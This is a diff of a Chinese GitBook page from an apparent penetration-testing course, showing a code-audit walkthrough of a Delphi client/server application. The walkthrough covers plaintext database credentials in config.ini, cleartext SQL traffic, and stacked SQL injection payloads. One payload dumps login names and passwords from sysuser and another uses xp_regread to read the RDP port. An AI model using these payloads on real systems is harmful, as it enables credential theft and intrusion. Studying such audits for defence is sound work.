@@ -21,7 +21,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-atom-dark.css">
                 
             
                 
@@ -46,6 +46,10 @@
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-terminal/plugin.css">
                 
             
                 
@@ -1881,52 +1885,72 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <p>&#x7A0B;&#x5E8F;&#x7684;&#x4E3B;&#x8981; function&#xFF0C;&#x4E0E; procedure</p>
-<p><strong>&#x6CE8;&#xFF1A;</strong>Delphi&#x628A;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x7684;&#x65B9;&#x6CD5;&#x5206;&#x6210;&#x4E86;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x662F;function&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;procedure&#xFF0C;&#x5927;&#x81F4;&#x7406;&#x89E3;&#x4E3A;&#x201C;&#x51FD;&#x6570;&#x201D;&#x548C;&#x201C;&#x8FC7;&#x7A0B;&#x201D;&#x3002;
-Procedure&#x7C7B;&#x4F3C;C&#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x65E0;&#x8FD4;&#x56DE;&#x503C;&#x51FD;&#x6570;&#xFF0C;&#x5373;VOID&#x3002;&#x800C;Function&#x5C31;&#x662F;c&#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x6709;&#x8FD4;&#x56DE;&#x503C;&#x51FD;&#x6570;&#xFF0C;&#x5373;&#x6CA1;&#x6709;Void&#x3002;<br><img src="media/21e65a213b1774c59d03619cb69683b4.jpg" alt=""></p>
-<p>&#x7A0B;&#x5E8F;&#x5206;&#x4E3A;2&#x79CD;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x6A21;&#x5F0F;&#xFF1A;<br><img src="media/080d91e0679721483224a0d29b818c61.jpg" alt=""></p>
-<p>&#x65E0;&#x8BBA;&#x662F;&#x672C;&#x5730;&#x6A21;&#x5F0F;&#xFF0C;&#x8FD8;&#x662F;&#x8054;&#x7F51;&#x6A21;&#x5F0F;&#xFF0C;&#x90FD;&#x662F;&#x8BFB;&#x53D6;&#xFF0C;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x7684;config.ini&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;
-<strong>&#xFF08;&#x5BFC;&#x81F4;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x66B4;&#x6F0F;&#xFF0C;&#x53EF;&#x76F4;&#x8FDE;&#x670D;&#x52A1;&#x5668;&#xFF09;</strong></p>
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><ul><li><span class="title-icon fa fa-hand-o-right"></span><a href="#delphi-&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;----&#x9879;&#x76EE;&#x5B9E;&#x6218;1"><b></b>Delphi &#x4EE3;&#x7801;&#x5BA1;&#x8BA1; -- &#x9879;&#x76EE;&#x5B9E;&#x6218;1</a></li><ul><li><span class="title-icon fa fa-hand-o-right"></span><a href="#1&#x3001;function--procedure"><b></b>1&#x3001;Function &amp; Procedure</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"><b></b>2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#3&#x3001;configini"><b></b>3&#x3001;config.ini</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#4&#x3001;cs-&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;"><b></b>4&#x3001;C/S &#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#5&#x3001;sql-&#x6CE8;&#x5165;"><b></b>5&#x3001;SQL &#x6CE8;&#x5165;</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#6&#x3001;client"><b></b>6&#x3001;Client</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#7&#x3001;&#x6784;&#x9020;-sql-&#x8BED;&#x53E5;"><b></b>7&#x3001;&#x6784;&#x9020; SQL &#x8BED;&#x53E5;</a></li><li><span class="title-icon fa fa-hand-o-right"></span><a href="#8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;"><b></b>8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;</a></li></ul></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h2 id="delphi-&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;----&#x9879;&#x76EE;&#x5B9E;&#x6218;1"><a name="delphi-&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;----&#x9879;&#x76EE;&#x5B9E;&#x6218;1" class="anchor-navigation-ex-anchor" href="#delphi-&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;----&#x9879;&#x76EE;&#x5B9E;&#x6218;1"><i class="fa fa-link" aria-hidden="true"></i></a><a name="delphi-&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;----&#x9879;&#x76EE;&#x5B9E;&#x6218;1" class="plugin-anchor" href="#delphi-&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;----&#x9879;&#x76EE;&#x5B9E;&#x6218;1"><i class="fa fa-link" aria-hidden="true"></i></a>Delphi &#x4EE3;&#x7801;&#x5BA1;&#x8BA1; -- &#x9879;&#x76EE;&#x5B9E;&#x6218;1</h2>
+<h3 id="1&#x3001;function--procedure"><a name="1&#x3001;function--procedure" class="anchor-navigation-ex-anchor" href="#1&#x3001;function--procedure"><i class="fa fa-link" aria-hidden="true"></i></a><a name="1&#x3001;function--procedure" class="plugin-anchor" href="#1&#x3001;function--procedure"><i class="fa fa-link" aria-hidden="true"></i></a>1&#x3001;Function &amp; Procedure</h3>
+<p>  Delphi &#x628A;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x7684;&#x65B9;&#x6CD5;&#x5206;&#x6210;&#x4E86;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x662F; function&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F; procedure&#xFF0C;&#x5927;&#x81F4;&#x7406;&#x89E3;&#x4E3A;&#x201C;&#x51FD;&#x6570;&#x201D;&#x548C;&#x201C;&#x8FC7;&#x7A0B;&#x201D;&#x3002;
+ Procedure &#x7C7B;&#x4F3C; C &#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x65E0;&#x8FD4;&#x56DE;&#x503C;&#x51FD;&#x6570;&#xFF0C;&#x5373; VOID&#x3002;&#x800C; Function &#x5C31;&#x662F; C &#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x6709;&#x8FD4;&#x56DE;&#x503C;&#x51FD;&#x6570;&#xFF0C;&#x5373;&#x6CA1;&#x6709; Void&#x3002;  </p>
+<p><img src="media/21e65a213b1774c59d03619cb69683b4.jpg" alt=""></p>
+<h3 id="2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"><a name="2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;" class="anchor-navigation-ex-anchor" href="#2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;" class="plugin-anchor" href="#2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"><i class="fa fa-link" aria-hidden="true"></i></a>2&#x3001;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;</h3>
+<p>&#x7A0B;&#x5E8F;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x6A21;&#x5F0F;&#xFF1A;  </p>
+<p><img src="media/080d91e0679721483224a0d29b818c61.jpg" alt=""></p>
+<p>&#x65E0;&#x8BBA;&#x662F;&#x672C;&#x5730;&#x6A21;&#x5F0F;&#xFF0C;&#x8FD8;&#x662F;&#x8054;&#x7F51;&#x6A21;&#x5F0F;&#xFF0C;&#x90FD;&#x662F;&#x8BFB;&#x53D6;&#xFF0C;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x7684; config.ini &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;  </p>
+<font color="red"> &#xFF08;&#x5BFC;&#x81F4;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x66B4;&#x6F0F;&#xFF0C;&#x53EF;&#x76F4;&#x8FDE;&#x670D;&#x52A1;&#x5668;&#xFF09; </font>
+
 <p><img src="media/00335e7c032c10d239df4a1c64a1543e.jpg" alt=""></p>
-<p>&#x7EE7;&#x7EED;&#x8DDF;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#xFF1A;&#x914D;&#x5408;SQL Server&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x76F4;&#x63A5;&#x5E26;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x51FA;&#x4E3A;&#x660E;&#x6587;&#x5B58;&#x50A8;&#x3002;<br><img src="media/f0281f9b417bfcff8962a51f84f410b3.jpg" alt=""></p>
-<p>config.ini&#x914D;&#x7F6E;&#x5982;&#x4E0B;&#xFF1A;<br><img src="media/7a7ab42ea759160c062a56d2c4f1cc88.jpg" alt=""></p>
-<p>&#x57FA;&#x4E8E;TCP&#x901A;&#x4FE1;&#xFF0C;SQL Server&#x901A;&#x4FE1;&#x6784;&#x67B6;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;
-<strong>&#xFF08;&#x53EF;&#x5BFC;&#x81F4;&#x901A;&#x4FE1;&#x8FC7;&#x7A0B;&#x4E2D;&#x6293;&#x53D6;&#x660E;&#x6587;&#x6267;&#x884C;&#xFF09;</strong></p>
+<p>&#x7EE7;&#x7EED;&#x8DDF;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#xFF1A;&#x914D;&#x5408;SQL Server&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x76F4;&#x63A5;&#x5E26;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x51FA;&#x4E3A;&#x660E;&#x6587;&#x5B58;&#x50A8;&#x3002;  </p>
+<p><img src="media/f0281f9b417bfcff8962a51f84f410b3.jpg" alt=""></p>
+<h3 id="3&#x3001;configini"><a name="3&#x3001;configini" class="anchor-navigation-ex-anchor" href="#3&#x3001;configini"><i class="fa fa-link" aria-hidden="true"></i></a><a name="3&#x3001;configini" class="plugin-anchor" href="#3&#x3001;configini"><i class="fa fa-link" aria-hidden="true"></i></a>3&#x3001;config.ini</h3>
+<p>config.ini &#x914D;&#x7F6E;&#x5982;&#x4E0B;&#xFF1A;  </p>
+<p><img src="media/7a7ab42ea759160c062a56d2c4f1cc88.jpg" alt=""></p>
+<h3 id="4&#x3001;cs-&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;"><a name="4&#x3001;cs-&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;" class="anchor-navigation-ex-anchor" href="#4&#x3001;cs-&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="4&#x3001;cs-&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;" class="plugin-anchor" href="#4&#x3001;cs-&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a>4&#x3001;C/S &#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;</h3>
+<p>&#x57FA;&#x4E8E;TCP&#x901A;&#x4FE1;&#xFF0C;SQL Server&#x901A;&#x4FE1;&#x6784;&#x67B6;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;</p>
+<font color="red"> &#xFF08;&#x53EF;&#x5BFC;&#x81F4;&#x901A;&#x4FE1;&#x8FC7;&#x7A0B;&#x4E2D;&#x6293;&#x53D6;&#x660E;&#x6587;&#x6267;&#x884C;&#xFF09; </font>
+
 <p><img src="media/109415886494f35eb1abb0dc65e1ea4a.jpg" alt=""></p>
-<p>&#x4EE3;&#x5165;&#x6267;&#x884C;&#xFF1A;
-<strong>&#xFF08;&#x5BFC;&#x81F4;&#x53EF;&#x62FC;&#x63A5;sql&#x8BED;&#x53E5;&#xFF0C;&#x67E5;&#x8BE2;&#x4EFB;&#x610F;&#x8BED;&#x53E5;&#x6216;&#x8005;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF09;</strong></p>
-<p><img src="media/f2d2fa55ca7000f6ac4e2a7f35096223.jpg" alt=""><br><img src="media/9c7cde20e5b9f00367d3e9e6742795bd.jpg" alt=""></p>
+<h3 id="5&#x3001;sql-&#x6CE8;&#x5165;"><a name="5&#x3001;sql-&#x6CE8;&#x5165;" class="anchor-navigation-ex-anchor" href="#5&#x3001;sql-&#x6CE8;&#x5165;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="5&#x3001;sql-&#x6CE8;&#x5165;" class="plugin-anchor" href="#5&#x3001;sql-&#x6CE8;&#x5165;"><i class="fa fa-link" aria-hidden="true"></i></a>5&#x3001;SQL &#x6CE8;&#x5165;</h3>
+<p>&#x4EE3;&#x5165;&#x6267;&#x884C;&#xFF1A;<font color="red">&#xFF08;&#x5BFC;&#x81F4;&#x53EF;&#x62FC;&#x63A5;sql&#x8BED;&#x53E5;&#xFF0C;&#x67E5;&#x8BE2;&#x4EFB;&#x610F;&#x8BED;&#x53E5;&#x6216;&#x8005;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF09;</font></p>
+<p><img src="media/f2d2fa55ca7000f6ac4e2a7f35096223.jpg" alt="">  </p>
+<p><img src="media/9c7cde20e5b9f00367d3e9e6742795bd.jpg" alt=""></p>
 <p>&#x90E8;&#x5206;&#x8BED;&#x53E5;&#x5176;&#x4E2D;&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre class="language-"><code class="lang-sql"><span class="token keyword">select</span> <span class="token keyword">distinct</span> memberid<span class="token punctuation">,</span>receivecompany 
-<span class="token keyword">from</span> weigh <span class="token keyword">where</span> receivecompany <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span> 
-<span class="token operator">and</span> receivecompany <span class="token operator">like</span> <span class="token string">&apos;&apos;</span><span class="token operator">%</span><span class="token string">&apos;+xxxxxx+&apos;</span><span class="token operator">%</span><span class="token string">&apos;&apos;</span>
+<pre class="language-"><code class="lang-sql"><span class="token keyword">select</span> <span class="token keyword">distinct</span> memberid<span class="token punctuation">,</span>receivecompany
+<span class="token keyword">from</span> weigh <span class="token keyword">where</span> receivecompany <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token operator">and</span> receivecompany <span class="token operator">like</span> <span class="token string">&apos;&apos;</span><span class="token operator">%</span><span class="token string">&apos;+xxxxxx+&apos;</span><span class="token operator">%</span><span class="token string">&apos;&apos;</span>
 </code></pre>
-<p>&#x8F6F;&#x4EF6;&#x5448;&#x73B0;&#x5982;&#x4E0B;&#xFF1A;<br><img src="media/fb920104b40786b665ab4f54efcc7f45.jpg" alt=""></p>
-<p>&#x5BF9;&#x5E94;&#x6536;&#x8D27;&#x5355;&#x4F4D;&#x7F16;&#x53F7;&#xFF0C;&#x4EE5;&#x53CA;&#x6536;&#x8D27;&#x5355;&#x4F4D;&#x540D;&#x79F0;&#x3002;&#x5206;&#x522B;&#x4E3A;&#xFF1A;<code>memberid</code>, <code>receivecompany</code></p>
-<p>&#x95ED;&#x5408;&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;
-<code>2&apos; ; select loginid as memberid , password as receivecompany from sysuser --</code><br><img src="media/3fe1f0dff1f17524e03aa152e59172b2.jpg" alt=""></p>
-<p>&#x6293;&#x53D6;&#x8FD4;&#x56DE;&#x5982;&#x56FE;&#xFF1A;
-&#x5F97;&#x5230;admin &#x8D26;&#x53F7;&#x4EE5;&#x53CA;&#x5BC6;&#x7801;&#x3002;<br><img src="media/0832ba025e9189a7099cd2e4dc368152.jpg" alt=""></p>
-<p>&#x6784;&#x9020;&#x8BFB;&#x53D6;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x7AEF;&#x53E3;&#x53F7;&#xFF1A;
-&#x5F97;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53E3;&#x53F7;</p>
+<h3 id="6&#x3001;client"><a name="6&#x3001;client" class="anchor-navigation-ex-anchor" href="#6&#x3001;client"><i class="fa fa-link" aria-hidden="true"></i></a><a name="6&#x3001;client" class="plugin-anchor" href="#6&#x3001;client"><i class="fa fa-link" aria-hidden="true"></i></a>6&#x3001;Client</h3>
+<p>&#x8F6F;&#x4EF6;&#x5448;&#x73B0;&#x5982;&#x4E0B;&#xFF1A;  </p>
+<p><img src="media/fb920104b40786b665ab4f54efcc7f45.jpg" alt=""></p>
+<h3 id="7&#x3001;&#x6784;&#x9020;-sql-&#x8BED;&#x53E5;"><a name="7&#x3001;&#x6784;&#x9020;-sql-&#x8BED;&#x53E5;" class="anchor-navigation-ex-anchor" href="#7&#x3001;&#x6784;&#x9020;-sql-&#x8BED;&#x53E5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="7&#x3001;&#x6784;&#x9020;-sql-&#x8BED;&#x53E5;" class="plugin-anchor" href="#7&#x3001;&#x6784;&#x9020;-sql-&#x8BED;&#x53E5;"><i class="fa fa-link" aria-hidden="true"></i></a>7&#x3001;&#x6784;&#x9020; SQL &#x8BED;&#x53E5;</h3>
+<p>&#x5BF9;&#x5E94;&#x6536;&#x8D27;&#x5355;&#x4F4D;&#x7F16;&#x53F7;&#xFF0C;&#x4EE5;&#x53CA;&#x6536;&#x8D27;&#x5355;&#x4F4D;&#x540D;&#x79F0;&#x3002;&#x5206;&#x522B;&#x4E3A;&#xFF1A;<code>memberid</code>, <code>receivecompany</code>&#x3002;&#x95ED;&#x5408;&#x8BED;&#x53E5;&#x4E3A;&#xFF1A;  </p>
+<pre class="language-"><code class="lang-sql"><span class="token number">2</span>&apos; <span class="token punctuation">;</span> <span class="token keyword">select</span> loginid <span class="token keyword">as</span> memberid <span class="token punctuation">,</span> password <span class="token keyword">as</span> receivecompany <span class="token keyword">from</span> sysuser <span class="token comment">--</span>
+</code></pre>
+<p><img src="media/3fe1f0dff1f17524e03aa152e59172b2.jpg" alt=""></p>
+<p>&#x6293;&#x53D6;&#x8FD4;&#x56DE;&#x5982;&#x56FE;&#xFF1A;  </p>
+<ul>
+<li>&#x5F97;&#x5230;admin &#x8D26;&#x53F7;&#x4EE5;&#x53CA;&#x5BC6;&#x7801;&#x3002;  </li>
+</ul>
+<p><img src="media/0832ba025e9189a7099cd2e4dc368152.jpg" alt=""></p>
+<ul>
+<li>&#x6784;&#x9020;&#x8BFB;&#x53D6;&#x8FDC;&#x7A0B;&#x684C;&#x9762;&#x7AEF;&#x53E3;&#x53F7;&#xFF1A;&#x5F97;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53E3;&#x53F7;  </li>
+</ul>
 <pre class="language-"><code class="lang-sql"><span class="token number">2</span><span class="token string">&apos; ; EXEC master..xp_regread &apos;</span>HKEY_LOCAL_MACHINE<span class="token string">&apos;,
 &apos;</span>SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP<span class="token operator">-</span>Tcp<span class="token string">&apos;,
 &apos;</span>PortNumber&apos; <span class="token comment">--</span>
 </code></pre>
-<p>copy &#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;&#xFF1A;
-<strong>&#xFF08;&#x5BFC;&#x81F4;&#x53EF;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6784;&#x9020;&#x4EE3;&#x7801;&#xFF09;</strong><br><img src="media/12eae8dd1c87a5e9f14244f5c7b4eb70.jpg" alt=""></p>
+<h3 id="8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;"><a name="8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;" class="anchor-navigation-ex-anchor" href="#8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;" class="plugin-anchor" href="#8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;"><i class="fa fa-link" aria-hidden="true"></i></a>8&#x3001;&#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;</h3>
+<p>copy &#x83B7;&#x53D6;&#x7F13;&#x51B2;&#x533A;&#x5185;&#x5BB9;&#xFF1A;<font color="red"> &#xFF08;&#x5BFC;&#x81F4;&#x53EF;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6784;&#x9020;&#x4EE3;&#x7801;&#xFF09;</font>  </p>
+<p><img src="media/12eae8dd1c87a5e9f14244f5c7b4eb70.jpg" alt=""></p>
 <p>copy &#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
 <blockquote>
 <p>copy&#xFF08;a,b,c);<br>a&#xFF1A;&#x5C31;&#x662F;copy&#x6E90;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x8868;&#x793A;&#x4F60;&#x5C06;&#x8981;&#x4ECE;a&#x91CC;copy&#x4E00;&#x4E9B;&#x4E1C;&#x897F;;<br>b&#xFF1A;&#x4ECE;a&#x4E2D;&#x7684;&#x7B2C;b&#x4F4D;&#x5F00;&#x59CB;copy&#xFF08;&#x5305;&#x542B;&#x7B2C;11&#x4F4D;&#xFF09;;<br>c&#xFF1A;copy&#x4ECE;&#x7B2C;b&#x4F4D;&#x5F00;&#x59CB;&#x540E;&#x7684;c&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;<br>exp&#xFF1A; m:=&#x2018;the test fuck&apos;<br>     s&#xFF1A;=copy&#xFF08;m,2,2&#xFF09;&#xFF1B; //s&#x503C;&#x4E3A;&#x2018;he&#x2019;</p>
 </blockquote>
-<p>&#x5F53;&#x8D85;&#x51FA;&#x8303;&#x56F4;&#xFF0C;&#x4F1A;&#x53D1;&#x751F;&#x5F02;&#x5E38;&#x9519;&#x8BEF;&#x3002;&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x5E93;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x540E;&#x8FDB;&#x884C;copy&#x3002;</p>
-<p>&#x8F6F;&#x4EF6;&#x767B;&#x9646;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;
-<strong>&#xFF08;&#x5BFC;&#x81F4;&#x53EF;&#x81EA;&#x52A8;&#x5316;&#x8DD1; loginid&#x3002;&#xFF09;</strong><br><img src="media/24734f4bbaa74f862cfbcac3b53faf83.jpg" alt=""></p>
-<p>&#x591A;&#x6B21;&#x5C1D;&#x8BD5;&#x9519;&#x8BEF;&#x5904;&#x7406;&#x5982;&#x4E0B;&#xFF1A;&#x9000;&#x51FA;&#x8F6F;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x91CD;&#x65B0;&#x5F00;&#x59CB;&#x8BA1;&#x7B97;&#x3002;<br><img src="media/4ec9526c01770e2d5f17c9cc9a76b26b.jpg" alt=""></p>
-<blockquote>
-<p>  Micropoor</p>
-</blockquote>
-<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Copyright &#xA9; 2019 Micro8. All Rights Reserved. &#x9075;&#x5FAA; <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" target="_blank">&#x77E5;&#x8BC6;&#x5171;&#x4EAB; &#x7F72;&#x540D;-&#x975E;&#x5546;&#x4E1A;&#x6027;&#x4F7F;&#x7528; 4.0 &#x534F;&#x8BAE;&#x53D1;&#x5E03;</a> </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A; 2019-02-23 </span> </footer>
+<p>&#x5F53;&#x8D85;&#x51FA;&#x8303;&#x56F4;&#xFF0C;&#x4F1A;&#x53D1;&#x751F;&#x5F02;&#x5E38;&#x9519;&#x8BEF;&#x3002;&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x5E93;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x540E;&#x8FDB;&#x884C; copy&#x3002;</p>
+<p>&#x8F6F;&#x4EF6;&#x767B;&#x9646;&#x90E8;&#x5206;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;<font color="red">&#xFF08;&#x5BFC;&#x81F4;&#x53EF;&#x81EA;&#x52A8;&#x5316;&#x8DD1; loginid&#x3002;&#xFF09;</font>    </p>
+<p><img src="media/24734f4bbaa74f862cfbcac3b53faf83.jpg" alt=""></p>
+<p>&#x591A;&#x6B21;&#x5C1D;&#x8BD5;&#x9519;&#x8BEF;&#x5904;&#x7406;&#x5982;&#x4E0B;&#xFF1A;&#x9000;&#x51FA;&#x8F6F;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x91CD;&#x65B0;&#x5F00;&#x59CB;&#x8BA1;&#x7B97;&#x3002;   </p>
+<p><img src="media/4ec9526c01770e2d5f17c9cc9a76b26b.jpg" alt=""></p>
+<p align="right">--By  Micropoor </p>
+
+
+<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Copyright &#xA9; 2019 Micro8. All Rights Reserved. &#x9075;&#x5FAA; <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" target="_blank">&#x77E5;&#x8BC6;&#x5171;&#x4EAB; &#x7F72;&#x540D;-&#x975E;&#x5546;&#x4E1A;&#x6027;&#x4F7F;&#x7528; 4.0 &#x534F;&#x8BAE;&#x53D1;&#x5E03;</a> </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A; 2019-03-03 </span> </footer>
                                 
                                 </section>
                             
@@ -1969,7 +1993,7 @@ Procedure&#x7C7B;&#x4F3C;C&#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x65E0;&#x8FD4;&#x56D
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第三课：Delphi代码审计--项目实战1","level":"1.4.3","depth":2,"next":{"title":"第四课：Asp代码审计--项目实战2","level":"1.4.4","depth":2,"path":"Chapter1/4_Asp代码审计--项目实战2.md","ref":"Chapter1/4_Asp代码审计--项目实战2.md","articles":[]},"previous":{"title":"第二课：Linux提权-依赖exp篇","level":"1.4.2","depth":2,"path":"Chapter1/2_Linux提权-依赖exp篇.md","ref":"Chapter1/2_Linux提权-依赖exp篇.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","-sharing","sharing-plus","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa 